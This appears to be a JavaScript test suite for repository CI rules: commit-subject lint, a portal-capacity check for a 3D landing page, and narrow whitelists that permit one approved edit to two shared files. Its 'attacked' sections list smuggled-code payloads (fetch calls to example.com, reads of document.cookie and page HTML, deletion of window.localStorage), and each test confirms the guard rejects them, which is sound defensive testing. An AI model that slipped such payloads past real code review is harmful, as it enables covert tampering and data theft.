  assert.equal(commitTicketId('Merge ss-041-flaky: SS-041 TD-009 recorded'), null);
  assert.equal(commitTicketId('feat(studio): SS-0411 x'), null);
  assert.equal(commitTicketId(undefined), null);
});

// --- The 3D landing page's portal capacity -----------------------------------

import { portalCapacity, allowOnlyFrontPortalRow, revertFrontPortalRow } from './lib/rules.mjs';

const CONSTANTS = n => `export const ARCADE_GAMES = [\n${
  Array.from({ length: n }, (_, i) => `    { name: "Game ${i}", url: "games/g${i}/", color: 0x00ff00 }`).join(',\n')
}\n];\n`;

/** A gameplay source with `rows` position tables of three, like the real one. */
const GAMEPLAY = (rows, { rotationsFor = null } = {}) => {
  const names = ['leftPositions', 'rightPositions', 'backPositions', 'frontPositions'].slice(0, rows);
  const table = name => `    const ${name} = [\n${
    Array.from({ length: 3 }, (_, i) => `        new THREE.Vector3(${i}, 2.5, ${i})`).join(',\n')
  }\n    ];\n`;
  const rotated = rotationsFor ?? names;
  return [
    'function createEnvironment() {\n',
    ...names.map(table),
    `    const positions = [${names.map(n => `...${n}`).join(', ')}];\n`,
    `    const rotations = [\n${rotated.map(n => `        ...${n}.map(() => 0)`).join(',\n')}\n    ];\n`,
    '}\n'
  ].join('');
};

test('portal capacity: a page with room for every game is clean', () => {
  const { games, slots, problems } = portalCapacity(GAMEPLAY(4), CONSTANTS(11));
  assert.equal(games, 11);
  assert.equal(slots, 12);
  assert.deepEqual(problems, []);
});

test('portal capacity: the defect this rule exists for is reported, with the count', () => {
  // Nine slots, eleven games — the state the landing page shipped in for months.
  const { games, slots, problems } = portalCapacity(GAMEPLAY(3), CONSTANTS(11));
  assert.equal(games, 11);
  assert.equal(slots, 9);
  assert.equal(problems.length, 1);
  assert.match(problems[0], /11 games but only 9 portal slots — the last 2 would be dropped silently/);
});

test('portal capacity: exactly enough slots is not a shortfall', () => {
  assert.deepEqual(portalCapacity(GAMEPLAY(3), CONSTANTS(9)).problems, []);
});

test('portal capacity: a position row with no matching rotation row is reported', () => {
  // The mistake adding a row invites: the portals render facing nowhere.
  const { problems } = portalCapacity(
    GAMEPLAY(4, { rotationsFor: ['leftPositions', 'rightPositions', 'backPositions'] }),
    CONSTANTS(11)
  );
  assert.equal(problems.length, 1);
  assert.match(problems[0], /frontPositions has positions but no matching rotations/);
});

test('portal capacity: a source it cannot read is reported, never assumed fine', () => {
  assert.match(portalCapacity(GAMEPLAY(3), 'export const SOMETHING_ELSE = [];').problems.join(),
    /could not find ARCADE_GAMES/);
  assert.match(portalCapacity('function createEnvironment() {}', CONSTANTS(11)).problems.join(),
    /could not find the positions table/);
  assert.match(portalCapacity(
    '    const positions = [...missingTable];\n    const rotations = [\n...missingTable.map(() => 0)\n];',
    CONSTANTS(11)
  ).problems.join(), /positions spreads missingTable, which is not declared as an array literal/);
});

// --- The shared/3d/gameplay.js exception -------------------------------------

const BASE_TABLES = `    const backPositions = [
        new THREE.Vector3(-roomWidth/4, 2.5, -roomDepth/2 + 1.2)
    ];
    const positions = [...leftPositions, ...rightPositions, ...backPositions];
    const rotations = [
        ...leftPositions.map(() => Math.PI/2),
        ...rightPositions.map(() => -Math.PI/2),
        ...backPositions.map(() => 0)
    ];
`;

const APPROVED_TABLES = `    const backPositions = [
        new THREE.Vector3(-roomWidth/4, 2.5, -roomDepth/2 + 1.2)
    ];
    // Front wall, above the trophy shelf. Three more slots, so the room holds
    // twelve portals rather than nine.
    const frontPositions = [
        new THREE.Vector3(-roomWidth/4, 4.0, roomDepth/2 - 1.2),
        new THREE.Vector3(roomWidth/4, 4.0, roomDepth/2 - 1.2),
        new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)
    ];
    const positions = [...leftPositions, ...rightPositions, ...backPositions, ...frontPositions];
    const rotations = [
        ...leftPositions.map(() => Math.PI/2),
        ...rightPositions.map(() => -Math.PI/2),
        ...backPositions.map(() => 0),
        ...frontPositions.map(() => Math.PI)
    ];
`;

const PREAMBLE = 'import * as THREE from "three";\nconst roomWidth = 18;\n';
const TAIL = '\n    ARCADE_GAMES.forEach((game, index) => {\n        if (!positions[index]) return;\n    });\n';

const before = PREAMBLE + BASE_TABLES + TAIL;
const after = PREAMBLE + APPROVED_TABLES + TAIL;

test('gameplay exception: the approved front-wall row is allowed', () => {
  assert.equal(revertFrontPortalRow(after), before);
  assert.equal(allowOnlyFrontPortalRow(before, after), null);
});

test('gameplay exception: an unchanged file is allowed', () => {
  assert.equal(allowOnlyFrontPortalRow(before, before), null);
});

test('gameplay exception: any other edit riding along is rejected', () => {
  // The whole point of a narrow exception: one approved change, nothing else.
  const smuggled = after.replace('const roomWidth = 18;', 'const roomWidth = 40;');
  assert.match(allowOnlyFrontPortalRow(before, smuggled), /changes beyond the front-wall portal row/);
});

test('gameplay exception: tampering inside the approved row is rejected', () => {
  const tampered = after.replace('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)',
    'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2); fetch("http://example.com")');
  assert.match(allowOnlyFrontPortalRow(before, tampered), /changes beyond the front-wall portal row/);
});

test('gameplay exception: a deleted line elsewhere is rejected', () => {
  const trimmed = after.replace('        if (!positions[index]) return;\n', '');
  assert.match(allowOnlyFrontPortalRow(before, trimmed), /changes beyond the front-wall portal row/);
});

test('gameplay exception: a trailing newline is content, not noise', () => {
  // The bug this test exists for: git output read through a trimming helper
  // lost the file's final newline, so the exception rejected its own edit.
  assert.match(allowOnlyFrontPortalRow(before.trimEnd(), after), /changes beyond the front-wall portal row/);
});

test('gameplay exception: a file absent from the base revision is rejected', () => {
  assert.match(allowOnlyFrontPortalRow('', after), /did not exist at the base revision/);
});

// --- The exception, attacked ------------------------------------------------
//
// Every payload below defeated an earlier version of the rule, which described
// an element as "a Vector3 call containing no parentheses". They are kept as
// the specification of what the whitelist has to exclude.

const withElement = text => after.replace('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)', text);

test('exception: a tagged template inside the arguments is rejected', () => {
  // fetch`...` calls without a single parenthesis.
  assert.match(
    allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2 + 0*!!fetch`https://example.com/x`)')),
    /changes beyond the front-wall portal row/);
});

test('exception: an assignment expression inside the arguments is rejected', () => {
  assert.match(
    allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(0, 4.0, window.__x = document.documentElement.innerHTML)')),
    /changes beyond the front-wall portal row/);
});

test('exception: a fourth element is rejected — the approved scope is three', () => {
  assert.match(
    allowOnlyFrontPortalRow(before, after.replace(
      'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)\n',
      'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2),\n        new THREE.Vector3(globalThis.x = 1, 0, 0)\n')),
    /changes beyond the front-wall portal row/);
});

test('exception: a two-element row is rejected — the shape is exact, not a minimum', () => {
  assert.match(
    allowOnlyFrontPortalRow(before, after.replace(
      '        new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)\n', '')),
    /changes beyond the front-wall portal row/);
});

test('exception: an argument may be arithmetic over identifiers, and nothing else', () => {
  // The forms the real edit needs must keep working, or the whitelist is useless.
  assert.equal(allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)')), null);
  assert.equal(allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(-roomWidth/4, 4.0, roomDepth / 2 - 2.0)')), null);
  for (const bad of ['new THREE.Vector3(0, 4.0, f(1))', 'new THREE.Vector3(0, 4.0, a ? b : c)',
                     'new THREE.Vector3(0, 4.0, [1][0])', 'new THREE.Vector3(0, 4.0, 1; drop())',
                     'new THREE.Vector3(0, 4.0)', 'new THREE.Vector3(0, 4.0, 1, 2)']) {
    assert.match(allowOnlyFrontPortalRow(before, withElement(bad)), /changes beyond the front-wall portal row/, bad);
  }
});

test('exception: leading comment lines are permitted, and bounded', () => {
  // A comment cannot execute, and `hygiene` scans this file because it is an
  // exception path, so smuggled *text* is caught there. Unbounded insertion is
  // still outside the approved scope, so the block caps them.
  const two = after.replace('    // Front wall,', '    // one\n    // two\n    // Front wall,');
  assert.equal(allowOnlyFrontPortalRow(before, two), null);
  const many = after.replace('    // Front wall,', '    // pad\n'.repeat(12) + '    // Front wall,');
  assert.match(allowOnlyFrontPortalRow(before, many), /changes beyond the front-wall portal row/);
});

test('portal capacity: the same tables in a different order is reported', () => {
  const { problems } = portalCapacity(
    GAMEPLAY(4, { rotationsFor: ['leftPositions', 'backPositions', 'rightPositions', 'frontPositions'] }),
    CONSTANTS(11)
  );
  assert.equal(problems.length, 1);
  assert.match(problems[0], /different orders/);
});

// --- The capacity rule, attacked ---------------------------------------------
//
// Each of these reported a full room while the page would still drop games.
// They came from an independent QA pass and are kept as the rule's spec.

test('capacity: an entry whose first key is not `name` still counts', () => {
  // The rule counted /\{\s*name\s*:/ — so { url, name, color }, which is valid
  // and which nothing in production forbids, was invisible to it.
  const reordered = `export const ARCADE_GAMES = [\n${
    Array.from({ length: 11 }, (_, i) => `    { url: "games/g${i}/", name: "G${i}", color: 0 }`).join(',\n')
  }\n];\n`;
  assert.equal(portalCapacity(GAMEPLAY(4), reordered).games, 11);
  assert.match(portalCapacity(GAMEPLAY(3), reordered).problems.join(), /11 games but only 9 portal slots/);
});

test('capacity: a positions table that is truncated as it is built is reported', () => {
  const sliced = GAMEPLAY(4).replace('...frontPositions];', '...frontPositions].slice(0, 9);');
  assert.match(portalCapacity(sliced, CONSTANTS(11)).problems.join(),
    /could not find the positions table as a plain array of spreads/);
});

test('capacity: a positions table shortened afterwards is reported', () => {
  const shortened = GAMEPLAY(4).replace('    const rotations = [', '    positions.length = 9;\n    const rotations = [');
  assert.match(portalCapacity(shortened, CONSTANTS(11)).problems.join(), /shortened after it is built/);
});

test('capacity: a commented-out position is not a slot', () => {
  const holed = GAMEPLAY(4).replace(
    '        new THREE.Vector3(0, 2.5, 0),\n        new THREE.Vector3(1, 2.5, 1),',
    '        // new THREE.Vector3(0, 2.5, 0),\n        // new THREE.Vector3(1, 2.5, 1),');
  const { slots, problems } = portalCapacity(holed, CONSTANTS(11));
  assert.equal(slots, 10);
  assert.match(problems.join(), /11 games but only 10 portal slots/);
});

test('capacity: the positions table may hold only spreads', () => {
  const inlined = GAMEPLAY(3).replace('...backPositions];', '...backPositions, someOtherThing];');
  assert.match(portalCapacity(inlined, CONSTANTS(9)).problems.join(),
    /holds something other than spreads: \.\.\.leftPositions/);
});

// --- The exception, attacked again -------------------------------------------
//
// The payloads above were written against the rule as it was before the
// whitelist, so they say what the *previous* hole was and nothing about this
// one. These were written against the grammar that is in force now: each one
// passed the character-class version, and each is valid JavaScript that acts.

const RESERVED = 'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)';  // the fixture's reserved slot
const withThirdArg = expr => after.replace(RESERVED, `new THREE.Vector3(0, 4.0, ${expr})`);

test('exception: an argument may not act, however few characters it uses', () => {
  // Every one of these is word characters, dots and arithmetic operators only —
  // which is why a character class could not exclude them. The grammar does,
  // by forbidding two operands with no operator between them.
  const payloads = {
    'delete engineState.walls': 'deletes a live object the room is built from',
    'delete window.localStorage': 'deletes a host property',
    'engineState.time++': 'assigns, using only +',
    '--state.counter': 'assigns, using only -',
    'new fetch': 'calls — `new` needs no parentheses',
    'new createGridTexture': 'calls a function in this very file',
    'void document.cookie': 'reads a getter',
    'typeof window': 'reads a getter',
    '1 /* pad */ + 1': 'smuggles a block comment inside an argument'
  };
  for (const [payload, why] of Object.entries(payloads)) {
    assert.match(allowOnlyFrontPortalRow(before, withThirdArg(payload)),
      /changes beyond the front-wall portal row/, `${payload} — ${why}`);
  }
});

test('exception: the arguments the real edit needs are still accepted', () => {
  // A whitelist that rejects the approved edit is not a whitelist, it is an
  // outage. These are every argument form the shipped row uses.
  for (const arg of ['roomDepth/2 - 1.2', '-roomWidth/4', '-roomWidth/2 + 2',
                     'roomDepth / 2 - 2.0', '4.0', '0']) {
    assert.equal(allowOnlyFrontPortalRow(before, withThirdArg(arg)), null, arg);
  }
});

test('exception: the approved row may not be relocated into another function', () => {
  // Reverting "the block, wherever it is" accepted the row moved verbatim
  // somewhere it would run at a different time.
  const block = after.slice(after.indexOf('    // Front wall'), after.indexOf('    const positions = ['));
  assert.ok(block.includes('frontPositions'), 'fixture did not yield the block');
  const moved = after.replace(block, '') + block;   // same bytes, somewhere else
  assert.match(allowOnlyFrontPortalRow(before, moved), /changes beyond the front-wall portal row/);
});

test('exception: positions without a matching rotation entry are rejected here, not only downstream', () => {
  const noRotation = after.replace(',\n        ...frontPositions.map(() => Math.PI)', '');
  assert.match(allowOnlyFrontPortalRow(before, noRotation), /no matching rotation entry/);
});

test('exception: the rotation entry must be the real statement, not the words in a comment', () => {
  // The loose check grepped the whole file, and the block's own comment lines
  // are reverted away — so the marker could sit in one while the real spread
  // was deleted, leaving twelve positions against nine rotations.
  const faked = after
    .replace(',\n        ...frontPositions.map(() => Math.PI)', '')
    .replace('    const frontPositions = [', '    // ...frontPositions.map(() => Math.PI)\n    const frontPositions = [');
  assert.match(allowOnlyFrontPortalRow(before, faked), /no matching rotation entry/);
});

// --- The shared/3d/constants.js exception (SHS-057, ADR-0010) ---------------
//
// One value of one entry: River Run's portal opens the studio fork. The rule is
// the frontPositions rule's shape — undo the approved edit, then demand the base
// byte for byte — so everything below is an edit that must not ride along.

import { allowOnlyStudioForkPortal, revertStudioForkPortal, STUDIO_FORK_PORTALS } from './lib/rules.mjs';

const PORTAL_LIST = url => `export const LOOK_FRICTION = 0.88; \n\nexport const ARCADE_GAMES = [
    { name: "Keypad Quest", url: "games/keypad-quest/", color: 0xffff00 },
    { name: "River Run Rapids", url: "${url}", color: 0x0088ff },
    { name: "Maze Warden", url: "games/maze-warden/", color: 0x2fe6ff }
];
`;
const portalBefore = PORTAL_LIST('games/river-run/');
const portalAfter = PORTAL_LIST('studio/games/river-run/');

test('constants exception: the one approved fork is River Run', () => {
  assert.deepEqual(STUDIO_FORK_PORTALS, [
    { name: 'River Run Rapids', from: 'games/river-run/', to: 'studio/games/river-run/' }
  ]);
  assert.ok(PATH_EXCEPTIONS.some(e => e.path === 'shared/3d/constants.js'));
});

test('constants exception: River Run pointed at its fork is allowed', () => {
  assert.equal(revertStudioForkPortal(portalAfter), portalBefore);
  assert.equal(allowOnlyStudioForkPortal(portalBefore, portalAfter), null);
});

test('constants exception: an unchanged file is allowed, before and after the change lands', () => {
  assert.equal(allowOnlyStudioForkPortal(portalBefore, portalBefore), null);
  // Once the change is the base, the next iteration sees an unchanged file.
  assert.equal(allowOnlyStudioForkPortal(portalAfter, portalAfter), null);
});

test('constants exception: any other edit riding along is rejected', () => {
  const smuggled = portalAfter.replace('0x0088ff', '0x0088fe');
  assert.match(allowOnlyStudioForkPortal(portalBefore, smuggled), /changes beyond River Run's portal url/);
  const elsewhere = portalAfter.replace('LOOK_FRICTION = 0.88', 'LOOK_FRICTION = 0.5');
  assert.match(allowOnlyStudioForkPortal(portalBefore, elsewhere), /changes beyond River Run's portal url/);
});

test('constants exception: a second url changed is rejected', () => {
  const two = portalAfter.replace('url: "games/keypad-quest/"', 'url: "studio/games/keypad-quest/"');
  assert.match(allowOnlyStudioForkPortal(portalBefore, two), /changes beyond River Run's portal url/);
});

test('constants exception: River Run pointed anywhere but its fork is rejected', () => {
  for (const url of ['studio/', 'studio/games/river-run/index.html', 'https://example.com/', 'studio/games/maze-warden/']) {
    assert.match(allowOnlyStudioForkPortal(portalBefore, PORTAL_LIST(url)), /changes beyond River Run's portal url/, url);
  }
});

test('constants exception: the fork url on another entry is rejected', () => {
  // The value is approved for River Run's entry, not wherever it appears.
  const moved = portalBefore.replace('url: "games/keypad-quest/"', 'url: "studio/games/river-run/"');
  assert.match(allowOnlyStudioForkPortal(portalBefore, moved), /changes beyond River Run's portal url/);
});

test('constants exception: a duplicated River Run entry is rejected', () => {
  const dup = portalAfter.replace('    { name: "Maze Warden"',
    '    { name: "River Run Rapids", url: "studio/games/river-run/", color: 0x0088ff },\n    { name: "Maze Warden"');
  assert.match(allowOnlyStudioForkPortal(portalBefore, dup), /changes beyond River Run's portal url/);
});

test('constants exception: a trailing newline is content, and a missing base is refused', () => {
  assert.match(allowOnlyStudioForkPortal(portalBefore.trimEnd(), portalAfter), /changes beyond River Run's portal url/);
  assert.match(allowOnlyStudioForkPortal('', portalAfter), /did not exist at the base revision/);
});

test('constants exception: undoing the fork portal returns the production url, and is allowed', () => {
  // Pointing River Run back at production is the rollback, not a new change.
  assert.equal(allowOnlyStudioForkPortal(portalAfter, portalBefore), null);
});

// ---- What a deploy check can actually see ------------------------------------

test('sameOriginAssets finds the scripts and stylesheets a page loads', () => {
  const html = [
    '<link rel="stylesheet" href="style.css">',
    '<link rel="icon" href="favicon.ico">',
    '<script src="main.js" type="module"></script>',
    '<script src="../shared/settings.js"></script>',
    '<script src="https://cdn.example.com/three.js"></script>'
  ].join('\n');
  const found = sameOriginAssets(html, 'https://host.test/studio/');
  assert.deepEqual(found, [
    'https://host.test/studio/main.js',
    'https://host.test/shared/settings.js',
    'https://host.test/studio/style.css'
  ]);
  // A CDN copy says nothing about whether *this* build is on the wire.
  assert.ok(!found.some(u => u.includes('cdn.example.com')));
  // A favicon link is not a stylesheet.
  assert.ok(!found.some(u => u.includes('favicon')));
});

test('moduleImports reaches the file that holds the words', () => {
  // The realm's page links main.js; main.js imports shelf-data.js; every word
  // the page shows is in shelf-data.js. A deploy check that reads only the HTML
  // proves the shell arrived and nothing about what is in it — which is the
  // state iteration 02 shipped into, with a correct deploy and a check that
  // could not see it.
  const source = [
    "import { PULSE, SHELF } from './shelf-data.js';",
    "import { shelfMarkup } from './shelf.js';",
    "const lazy = await import('./later.js');",
    "export { thing } from './other.js';",
    "import three from 'https://cdn.example.com/three.js';"
  ].join('\n');
  const found = moduleImports(source, 'https://host.test/studio/main.js');
  // Order follows the pattern list, not the source, and the check queues them
  // all — so this asserts the set rather than a sequence nothing depends on.
  assert.deepEqual([...found].sort(), [
    'https://host.test/studio/later.js',
    'https://host.test/studio/other.js',
    'https://host.test/studio/shelf-data.js',
    'https://host.test/studio/shelf.js'
  ]);
  assert.ok(!found.some(u => u.includes('cdn.example.com')), 'a CDN import is not this build');
});

test('neither helper throws on nonsense', () => {
  assert.deepEqual(sameOriginAssets('', 'https://host.test/'), []);
  assert.deepEqual(sameOriginAssets(null, 'https://host.test/'), []);
  assert.deepEqual(sameOriginAssets('<script src="::::">', 'https://host.test/'),
    ['https://host.test/::::'], 'an unparseable-looking specifier is just a path');
  assert.deepEqual(moduleImports('', 'https://host.test/a.js'), []);
  assert.deepEqual(moduleImports(null, 'https://host.test/a.js'), []);
  // A junk specifier resolves to a junk path rather than throwing; the check
  // then fetches it, gets a 404, and moves on.
  assert.deepEqual(moduleImports("import x from '::::'", 'https://host.test/a.js'),
    ['https://host.test/::::']);
});

// --- The handbook's own examples obey the rules they illustrate ----------------

test('commit lint: every example commit subject in the handbook passes the lint', async () => {
  // The prefix change left `SHS-003` in process.md — an example of the
  // convention that the convention's own rule rejects. Examples are read from
  // the documents, not copied here, so the next one is checked too.
  //
  // What counts as an example is anything shaped like a studio commit subject
  // with a ticket number — any type, with or without `!`, inline or in a fenced
  // block, in any handbook document at any depth. The first version matched
  // only inline code with one of the nine allowed types in top-level files, so
  // `ci(studio): SHS-050 …`, `feat(studio)!: …`, a fenced block, or an example
  // in `decisions/` or `team/` all passed unchecked.
  //
  // The records are excluded: iterations/, the changelog and the learning log
  // quote subjects that were rejected, because that is what happened.
  const { readdirSync, readFileSync, statSync } = await import('node:fs');
  const path = await import('node:path');
  const { fileURLToPath } = await import('node:url');
  const docs = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../docs/studio');
  const RECORDS = new Set(['iterations', 'CHANGELOG.md', 'learning-log.md']);
  const files = [];
  const walk = dir => {
    for (const name of readdirSync(dir)) {
      if (dir === docs && RECORDS.has(name)) continue;
      const full = path.join(dir, name);
      if (statSync(full).isDirectory()) walk(full);
      else if (/\.md$/i.test(name)) files.push(full);
    }
  };
  walk(docs);
  const example = /\b[a-z]+\(studio\)!?: (?:SHS|SS)-\d{3}\b[^`\n]*/g;
  const found = [];
  for (const file of files) {
    for (const [subject] of readFileSync(file, 'utf8').matchAll(example)) {
      found.push({ file: path.relative(docs, file), subject: subject.trim().replace(/\.$/, '') });
    }
  }
  assert.ok(found.length, 'no example commit subjects found — the pattern no longer matches the handbook');
  for (const { file, subject } of found) assert.equal(lintCommitSubject(subject), null, `${file}: ${subject}`);
});

// --- A squash-merged pull request (SHS-070, ADR-0011 §4) ------------------------
// GitHub's squash-merge appends " (#N)" to the subject. The lint counts the
// subject without it, and judges everything else exactly as before.

const at80 = 'feat(studio): SHS-070 ' + 'x'.repeat(80 - 'feat(studio): SHS-070 '.length);

test('commit lint: a squash-merged subject passes when it fits in 80 without its " (#N)"', () => {
  assert.equal(at80.length, 80);
  assert.equal(lintCommitSubject(`${at80} (#12)`), null);
  assert.equal(lintCommitSubject('fix(studio): SHS-070 accept a ticket branch (#1234)'), null);
});

test('commit lint: a squash-merged subject still fails without a ticket, or past 80 without the suffix', () => {
  assert.match(lintCommitSubject('feat(studio): accept a ticket branch (#12)'), /expected/);
  assert.match(lintCommitSubject('feat: SHS-070 accept a ticket branch (#12)'), /expected/);
  assert.match(lintCommitSubject(`${at80}x (#12)`), /81 characters/);
  // Only a trailing " (#N)" is a squash-merge's; anything else still counts.
  assert.match(lintCommitSubject(`${at80}(#12)`), /characters/);
  assert.match(lintCommitSubject(`${at80} (#12) more`), /characters/);
  assert.match(lintCommitSubject(`${at80} (#x)`), /characters/);
});

test('path guard: a squash-merged studio commit is judged like any other studio commit', () => {
  const squash = 'feat(studio): SHS-070 accept a ticket branch (#12)';
  assert.equal(commitKind({ sha: 'd'.repeat(40), subject: squash }).kind, 'studio');
  const inside = sortCommitsByKind([C(squash, ['studio/a.js', 'tests/studio/b.mjs'])]);
  assert.deepEqual(classifyPaths(inside.studioPaths).violations, []);
  const outside = sortCommitsByKind([C(squash, ['studio/a.js', 'games/durak/main.js'])]);
  assert.deepEqual(classifyPaths(outside.studioPaths).violations, ['games/durak/main.js']);
});
